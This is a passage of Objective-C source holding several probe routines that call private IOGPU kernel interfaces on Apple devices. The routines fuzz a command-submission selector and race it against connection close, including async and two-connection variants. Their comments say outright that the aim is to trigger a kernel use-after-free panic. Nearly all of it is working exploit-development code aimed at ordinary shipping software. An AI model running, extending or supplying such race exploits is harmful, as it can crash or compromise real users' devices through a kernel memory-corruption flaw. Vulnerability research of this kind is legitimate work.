    io_service_t svc = matching ? pGet(*pMainPort, matching) : 0;
    io_connect_t dconn = 0;
    void *dev = NULL;
    if (svc && pDevCreate) {
        dev = pDevCreate(svc);
        if (dev && pDevGetConn) dconn = pDevGetConn(dev);
        [out appendFormat:@"IOGPUDeviceCreate conn=%u\n", dconn];
    }

    io_connect_t conn = qconn ? qconn : dconn;
    if (conn && pCall) {
        void *inS = calloc(1, 128);
        void *outS = calloc(1, 0x100);
        size_t oc = 0x100;
        kern_return_t r = pCall(conn, 9, NULL, 0, inS, 128, NULL, NULL, outS, &oc);
        [out appendFormat:@"sel=9 after blit conn=%u -> 0x%08x%@\n", conn, (unsigned)r, p010KrName((unsigned)r)];
        if (qid) {
            *(uint32_t *)inS = qid;
            oc = 0x100;
            r = pCall(conn, 9, NULL, 0, inS, 128, NULL, NULL, outS, &oc);
            [out appendFormat:@"sel=9 struct[0]=GetID -> 0x%08x%@\n", (unsigned)r, p010KrName((unsigned)r)];
        }
        free(inS); free(outS);
    }

    if (dev && pDevRelease) pDevRelease(dev);
    if (svc && pRelease) pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"No close. blit status 1 or 2 = GPU submit reached kernel.\n"];
    return out;
}

+ (NSString *)runP010Sel26Probe {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 sel=26 probe -- SubmitCommandBuffers on 22H311\n"];
    [out appendString:@"Submit() does mov w1,#26. sel=9 was the wrong method.\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    typedef uint32_t (*QueueGetConn_t)(void *);
    DevCreate_t pDevCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pDevGetConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = dlsym(iogpu, "IOGPUCommandQueueGetID");
    QueueGetConn_t pQGetConn = dlsym(iogpu, "IOGPUCommandQueueGetConnect");
    uint8_t *pSubmit = (uint8_t *)dlsym(iogpu, "IOGPUCommandQueueSubmitCommandBuffers");

    if (pSubmit) {
        [out appendString:@"--- Submit around +0xd4 ---\n"];
        for (int i = 0xc0; i < 0x100; i += 16) {
            [out appendFormat:@"%03x:", i];
            for (int j = 0; j < 16; j++) [out appendFormat:@" %02x", pSubmit[i+j]];
            [out appendString:@"\n"];
        }
        [out appendString:@"--- mov wN imm in Submit ---\n"];
        for (int i = 0; i < 0x200; i += 4) {
            uint32_t inst = *(uint32_t *)(pSubmit + i);
            if ((inst & 0xff800000) != 0x52800000) continue;
            uint32_t rd = inst & 0x1f;
            uint32_t imm = (inst >> 5) & 0xffff;
            if (rd <= 7 && imm < 4096)
                [out appendFormat:@"  +0x%03x: mov w%u, #%u\n", i, rd, imm];
        }
    }

    CFMutableDictionaryRef matching = pMatching("IOGPU");
    io_service_t svc = matching ? pGet(*pMainPort, matching) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn = pDevGetConn(dev);

    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue = pQueueCreate(dev, args, 0x410);
    free(args);
    uint32_t qid = (queue && pGetID) ? pGetID(queue) : 1;
    uint32_t qconn = (queue && pQGetConn) ? pQGetConn(queue) : conn;
    [out appendFormat:@"devConn=%u qconn=%u qid=%u queue=%p\n\n", conn, qconn, qid, queue];

    void *outS = calloc(1, 0x100);
    void (^logCall)(const char *, kern_return_t) = ^(const char *lab, kern_return_t r) {
        unsigned ur = (unsigned)r;
        if (ur == 0xe00002c2) return;
        [out appendFormat:@"%s -> 0x%08x%@\n", lab, ur, p010KrName(ur)];
    };

    size_t oc = 0x100;
    logCall("empty", pCall(conn, 25, NULL, 0, NULL, 0, NULL, NULL, outS, &oc));

    for (uint32_t n = 1; n <= 8; n++) {
        uint64_t sc[8] = {qid, 0, 1, 0x80, 0, 0, 0, 0};
        oc = 0x100;
        char lab[64];
        snprintf(lab, sizeof(lab), "sc%u qid-first", n);
        logCall(lab, pCall(conn, 25, sc, n, NULL, 0, NULL, NULL, outS, &oc));
    }

    uint32_t sizes[] = {8, 16, 32, 64, 0x80, 0xa0, 0x100, 0x200, 0x408, 0x800, 0x1000};
    for (int i = 0; i < 11; i++) {
        uint32_t sz = sizes[i];
        void *inS = calloc(1, sz);
        oc = 0x100;
        char lab[64];
        snprintf(lab, sizeof(lab), "struct %u", sz);
        logCall(lab, pCall(conn, 25, NULL, 0, inS, sz, NULL, NULL, outS, &oc));
        uint64_t sc[4] = {qid, 0, 1, sz};
        oc = 0x100;
        snprintf(lab, sizeof(lab), "4sc+struct %u", sz);
        logCall(lab, pCall(conn, 25, sc, 4, inS, sz, NULL, NULL, outS, &oc));
        free(inS);
    }

    // 4 scalars, no struct -- AGXBarrierPanic shape
    {
        uint64_t sc[4] = {qid, 0, 1, 0x80};
        oc = 0x100;
        logCall("4sc {qid,0,1,0x80}", pCall(conn, 25, sc, 4, NULL, 0, NULL, NULL, outS, &oc));
    }

    free(outS);
    if (pDevRelease) pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"Any non-BadArg on sel=26 = submit dispatched. Then race vs close.\n"];
    return out;
}

+ (NSString *)runP010Sel26NullOut {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 sel=26 NULL-out -- match Submit (4 scalars, no output)\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    typedef uint32_t (*QueueGetConn_t)(void *);
    DevCreate_t pDevCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pDevGetConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = dlsym(iogpu, "IOGPUCommandQueueGetID");
    QueueGetConn_t pQGetConn = dlsym(iogpu, "IOGPUCommandQueueGetConnect");
    uint8_t *pSubmit = (uint8_t *)dlsym(iogpu, "IOGPUCommandQueueSubmitCommandBuffers");

    if (pSubmit) {
        [out appendString:@"--- Submit 0x40-0xc0 ---\n"];
        for (int i = 0x40; i < 0xc0; i += 16) {
            [out appendFormat:@"%03x:", i];
            for (int j = 0; j < 16; j++) [out appendFormat:@" %02x", pSubmit[i+j]];
            [out appendString:@"\n"];
        }
    }

    CFMutableDictionaryRef matching = pMatching("IOGPU");
    io_service_t svc = matching ? pGet(*pMainPort, matching) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t dconn = pDevGetConn(dev);

    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue = pQueueCreate(dev, args, 0x410);
    free(args);
    uint32_t qid = (queue && pGetID) ? pGetID(queue) : 1;
    [out appendFormat:@"fw queue=%p qid=%u dconn=%u\n", queue, qid, dconn];

    id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
    id<MTLCommandQueue> mq = [mtl newCommandQueue];
    void *mtlQ = NULL;
    Class cls = object_getClass(mq);
    while (cls && !mtlQ) {
        unsigned int n = 0;
        Ivar *ivars = class_copyIvarList(cls, &n);
        for (unsigned int i = 0; i < n; i++) {
            const char *nm = ivar_getName(ivars[i]);
            if (nm && strcmp(nm, "_commandQueue") == 0) {
                mtlQ = *(void **)((char *)(__bridge void *)mq + ivar_getOffset(ivars[i]));
                break;
            }
        }
        free(ivars);
        cls = class_getSuperclass(cls);
    }
    uint32_t mtlQid = (mtlQ && pGetID) ? pGetID(mtlQ) : 0;
    uint32_t mtlConn = (mtlQ && pQGetConn) ? pQGetConn(mtlQ) : 0;
    [out appendFormat:@"mtl _commandQueue=%p GetID=%u GetConnect=%u\n\n", mtlQ, mtlQid, mtlConn];

    void (^try26)(io_connect_t, uint32_t, const char *) = ^(io_connect_t c, uint32_t idv, const char *tag) {
        [out appendFormat:@"--- %s conn=%u qid=%u ---\n", tag, c, idv];
        kern_return_t r;
        r = pCall(c, 25, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
        if ((unsigned)r != 0xe00002c2) [out appendFormat:@"empty -> 0x%08x%@\n", (unsigned)r, p010KrName((unsigned)r)];

        uint64_t sc[4] = {idv, 0, 1, 0};
        r = pCall(c, 25, sc, 4, NULL, 0, NULL, NULL, NULL, NULL);
        [out appendFormat:@"4sc {qid,0,1,0} nostruct -> 0x%08x%@\n", (unsigned)r, p010KrName((unsigned)r)];

        uint32_t sizes[] = {8, 16, 32, 64, 0x80, 0xa0, 0xc0, 0x100, 0x200, 0x408};
        for (int i = 0; i < 10; i++) {
            uint32_t sz = sizes[i];
            void *inS = calloc(1, sz);
            sc[0] = idv; sc[1] = 0; sc[2] = 1; sc[3] = sz;
            r = pCall(c, 25, sc, 4, inS, sz, NULL, NULL, NULL, NULL);
            if ((unsigned)r != 0xe00002c2)
                [out appendFormat:@"4sc+struct %u -> 0x%08x%@\n", sz, (unsigned)r, p010KrName((unsigned)r)];
            sc[2] = 0; sc[3] = 0;
            r = pCall(c, 25, sc, 4, inS, sz, NULL, NULL, NULL, NULL);
            if ((unsigned)r != 0xe00002c2)
                [out appendFormat:@"4sc {qid,0,0,0}+struct %u -> 0x%08x%@\n", sz, (unsigned)r, p010KrName((unsigned)r)];
            free(inS);
        }
        uint64_t sc1 = idv;
        r = pCall(c, 25, &sc1, 1, NULL, 0, NULL, NULL, NULL, NULL);
        if ((unsigned)r != 0xe00002c2) [out appendFormat:@"1sc qid -> 0x%08x%@\n", (unsigned)r, p010KrName((unsigned)r)];
    };

    try26(dconn, qid, "IOGPUDeviceCreate");
    if (mtlConn) try26(mtlConn, mtlQid, "Metal GetConnect");

    if (pDevRelease) pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"non-BadArg = sel=26 dispatched. Race that vs close (IOConnect, not Metal commit).\n"];
    return out;
}

+ (NSString *)runP010Sel26CloseRace {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 sel=26 vs IOServiceClose N=20000\n"];
    [out appendString:@"Handler loads UC+0x120 (GPU device). BadArg = handler ran.\n"];
    [out appendString:@"Panic = UAF. App crash = dead port (not UAF). Do NOT re-tap if panic.\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pDevGetConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = dlsym(iogpu, "IOGPUCommandQueueGetID");

    CFMutableDictionaryRef matching = pMatching("IOGPU");
    io_service_t svc = matching ? pGet(*pMainPort, matching) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn = pDevGetConn(dev);

    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue = pQueueCreate(dev, args, 0x410);
    free(args);
    if (!queue) { [out appendString:@"STOP no queue\n"]; pDevRelease(dev); pRelease(svc); return out; }
    uint32_t qid = pGetID ? pGetID(queue) : 1;
    [out appendFormat:@"conn=%u qid=%u queue=%p\n", conn, qid, queue];

    const uint32_t stride = 0x40;
    uint64_t sc[4] = {qid, 0, 1, stride};
    void *inS = calloc(1, stride);
    kern_return_t r0 = pCall(conn, 25, sc, 4, inS, stride, NULL, NULL, NULL, NULL);
    [out appendFormat:@"serial sel=26 -> 0x%08x%@\n", (unsigned)r0, p010KrName((unsigned)r0)];

    __block volatile int go = 0;
    __block int ncall = 0;
    __block unsigned last = 0;
    __block kern_return_t closeRc = -1;
    dispatch_queue_t q1 = dispatch_queue_create("p010.s26", NULL);
    dispatch_queue_t q2 = dispatch_queue_create("p010.cl", NULL);
    dispatch_group_t grp = dispatch_group_create();

    dispatch_group_async(grp, q1, ^{
        while (!go) {}
        uint64_t lsc[4] = {qid, 0, 1, stride};
        void *lin = calloc(1, stride);
        for (int i = 0; i < 20000; i++) {
            kern_return_t r = pCall(conn, 25, lsc, 4, lin, stride, NULL, NULL, NULL, NULL);
            last = (unsigned)r;
            ncall++;
        }
        free(lin);
    });
    dispatch_group_async(grp, q2, ^{
        while (!go) {}
        for (volatile int i = 0; i < 20; i++) {}
        closeRc = pClose(conn);
    });
    go = 1;
    dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);

    [out appendFormat:@"sel=26 calls=%d last=0x%08x close=0x%08x\n", ncall, last, (unsigned)closeRc];
    [out appendString:@"survived = missed window. panic = UAF.\n"];
    free(inS);
    if (pDevRelease) pDevRelease(dev);
    pRelease(svc);
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}


+ (NSString *)runP010Async26CloseRace {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 async sel=26 vs IOServiceClose\n"];
    [out appendString:@"Async dispatches to workloop, returns immediately.\n"];
    [out appendString:@"Close runs clientClose while handler still on workloop.\n"];
    [out appendString:@"Panic = UAF. Do NOT re-tap if panic.\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    // IOConnectCallAsyncMethod
    typedef kern_return_t (*IOConnectCallAsyncMethod_t)(
        mach_port_t, uint32_t, mach_port_t,
        uint64_t *, uint32_t,
        const uint64_t *, uint32_t,
        const void *, size_t,
        uint64_t *, uint32_t *,
        void *, size_t *);
    IOConnectCallAsyncMethod_t pAsyncCall =
        (IOConnectCallAsyncMethod_t)dlsym(iokit, "IOConnectCallAsyncMethod");
    if (!pAsyncCall) {
        [out appendString:@"STOP no IOConnectCallAsyncMethod\n"];
        return out;
    }
    [out appendFormat:@"asyncMethod=0x%llx\n", (uint64_t)pAsyncCall];

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pDevGetConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = dlsym(iogpu, "IOGPUCommandQueueGetID");

    CFMutableDictionaryRef matching = pMatching("IOGPU");
    io_service_t svc = matching ? pGet(*pMainPort, matching) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn = pDevGetConn(dev);

    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue = pQueueCreate(dev, args, 0x410);
    free(args);
    if (!queue) { [out appendString:@"STOP no queue\n"]; pDevRelease(dev); pRelease(svc); return out; }
    uint32_t qid = pGetID ? pGetID(queue) : 1;
    [out appendFormat:@"conn=%u qid=%u queue=%p\n", conn, qid, queue];

    // Create wake port for async callback
    mach_port_t wakePort = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wakePort);
    mach_port_insert_right(mach_task_self(), wakePort, wakePort, MACH_MSG_TYPE_MAKE_SEND);
    [out appendFormat:@"wakePort=%u\n\n", wakePort];

    // Serial test: async sel=26 once (no close)
    const uint32_t stride = 0x40;
    uint64_t sc[4] = {qid, 0, 1, stride};
    void *inS = calloc(1, stride);
    uint64_t ref = 0;
    uint32_t refCnt = 0;
    kern_return_t r0 = pAsyncCall(conn, 25, wakePort, &ref, refCnt,
                                   sc, 4, inS, stride,
                                   NULL, NULL, NULL, NULL);
    [out appendFormat:@"serial async sel=26 -> 0x%08x%@\n", (unsigned)r0, p010KrName((unsigned)r0)];

    // Drain any wake message (non-blocking)
    {
        uint8_t msgBuf[256];
        mach_msg_return_t mr = mach_msg((mach_msg_header_t *)msgBuf, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                                         0, sizeof(msgBuf), wakePort, 100, MACH_PORT_NULL);
        [out appendFormat:@"wake msg drain: 0x%08x\n", (unsigned)mr];
    }

    // Race: fire N async sel=26 calls, then close
    __block volatile int go = 0;
    __block int ncall = 0;
    __block unsigned last = 0;
    __block kern_return_t closeRc = -1;
    dispatch_queue_t q1 = dispatch_queue_create("p010.async", NULL);
    dispatch_queue_t q2 = dispatch_queue_create("p010.cl2", NULL);
    dispatch_group_t grp = dispatch_group_create();

    dispatch_group_async(grp, q1, ^{
        while (!go) {}
        uint64_t lsc[4] = {qid, 0, 1, stride};
        void *lin = calloc(1, stride);
        uint64_t lref = 0;
        for (int i = 0; i < 5000; i++) {
            kern_return_t r = pAsyncCall(conn, 25, wakePort, &lref, 0,
                                        lsc, 4, lin, stride,
                                        NULL, NULL, NULL, NULL);
            last = (unsigned)r;
            ncall++;
        }
        free(lin);
    });
    dispatch_group_async(grp, q2, ^{
        while (!go) {}
        for (volatile int i = 0; i < 10; i++) {}
        closeRc = pClose(conn);
    });
    go = 1;
    dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);

    [out appendFormat:@"\nasync calls=%d last=0x%08x close=0x%08x\n", ncall, last, (unsigned)closeRc];
    [out appendString:@"survived = missed. panic = UAF.\n"];

    mach_port_destroy(mach_task_self(), wakePort);
    free(inS);
    if (pDevRelease) pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"last=MIG_BAD(0x10000003) = close won MIG. last=BadArg = handler ran.\n"];
    return out;
}

+ (NSString *)runP010TwoConnRaceOld {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 two-conn race -- sel=26 on conn1 vs close on conn2\n"];
    [out appendString:@"If GPU device at +0x120 is shared, close conn2\n"];
    [out appendString:@"frees it while conn1 handler reads it.\n"];
    [out appendString:@"Panic = UAF. Do NOT re-tap if panic.\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pDevGetConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = dlsym(iogpu, "IOGPUCommandQueueGetID");

    CFMutableDictionaryRef matching = pMatching("IOGPU");
    io_service_t svc = matching ? pGet(*pMainPort, matching) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }

    // Open TWO connections to the same IOGPU service
    void *dev1 = pDevCreate(svc);
    void *dev2 = pDevCreate(svc);
    if (!dev1 || !dev2) { [out appendString:@"STOP no devs\n"]; pRelease(svc); return out; }
    io_connect_t conn1 = pDevGetConn(dev1);
    io_connect_t conn2 = pDevGetConn(dev2);
    [out appendFormat:@"conn1=%u conn2=%u\n", conn1, conn2];

    // Create queue on conn1
    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev1 + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev1 + 0x08);
    void *queue = pQueueCreate(dev1, args, 0x410);
    free(args);
    uint32_t qid = (queue && pGetID) ? pGetID(queue) : 1;
    [out appendFormat:@"queue=%p qid=%u on conn1\n\n", queue, qid];

    // Serial: sel=26 on conn1, sel=26 on conn2 (does conn2 accept conn1's qid?)
    const uint32_t stride = 0x40;
    uint64_t sc[4] = {qid, 0, 1, stride};
    void *inS = calloc(1, stride);
    kern_return_t r1 = pCall(conn1, 25, sc, 4, inS, stride, NULL, NULL, NULL, NULL);
    kern_return_t r2 = pCall(conn2, 25, sc, 4, inS, stride, NULL, NULL, NULL, NULL);
    [out appendFormat:@"serial: conn1 sel=26 -> 0x%08x%@  conn2 sel=26 -> 0x%08x%@\n",
     (unsigned)r1, p010KrName((unsigned)r1), (unsigned)r2, p010KrName((unsigned)r2)];

    // Race: sel=26 on conn1 (tight loop) vs IOServiceClose on conn2
    __block volatile int go = 0;
    __block int ncall = 0;
    __block unsigned last = 0;
    __block kern_return_t closeRc = -1;
    dispatch_queue_t qA = dispatch_queue_create("p010.c1", NULL);
    dispatch_queue_t qB = dispatch_queue_create("p010.c2", NULL);
    dispatch_group_t grp = dispatch_group_create();

    dispatch_group_async(grp, qA, ^{
        while (!go) {}
        uint64_t lsc[4] = {qid, 0, 1, stride};
        void *lin = calloc(1, stride);
        for (int i = 0; i < 50000; i++) {
            kern_return_t r = pCall(conn1, 25, lsc, 4, lin, stride, NULL, NULL, NULL, NULL);
            last = (unsigned)r;
            ncall++;
        }
        free(lin);
    });
    dispatch_group_async(grp, qB, ^{
        while (!go) {}
        for (volatile int i = 0; i < 5; i++) {}
        closeRc = pClose(conn2);
    });
    go = 1;
    dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);

    [out appendFormat:@"\nconn1 sel=26 calls=%d last=0x%08x\n", ncall, last];
    [out appendFormat:@"conn2 close=0x%08x\n", (unsigned)closeRc];
    [out appendString:@"survived = missed or not shared. panic = UAF.\n"];

    free(inS);
    if (pDevRelease) pDevRelease(dev1);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"last=BadArg on conn1 = handler ran after close = shared GPU device.\n"];
    [out appendString:@"last=MIG_BAD = conn1 died too. panic = UAF.\n"];
    return out;
}

+ (NSString *)runP010StrideSweep {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 stride sweep -- find cmdBufArgSize for sel=26\n"];
    [out appendString:@"BadArg = wrong stride. Non-BadArg = reached +0x120.\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pDevGetConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = dlsym(iogpu, "IOGPUCommandQueueGetID");

    CFMutableDictionaryRef matching = pMatching("IOGPU");
    io_service_t svc = matching ? pGet(*pMainPort, matching) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn = pDevGetConn(dev);

    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue = pQueueCreate(dev, args, 0x410);
    free(args);
    if (!queue) { [out appendString:@"STOP no queue\n"]; pDevRelease(dev); pRelease(svc); return out; }
    uint32_t qid = pGetID ? pGetID(queue) : 1;
    [out appendFormat:@"conn=%u qid=%u queue=%p\n\n", conn, qid, queue];

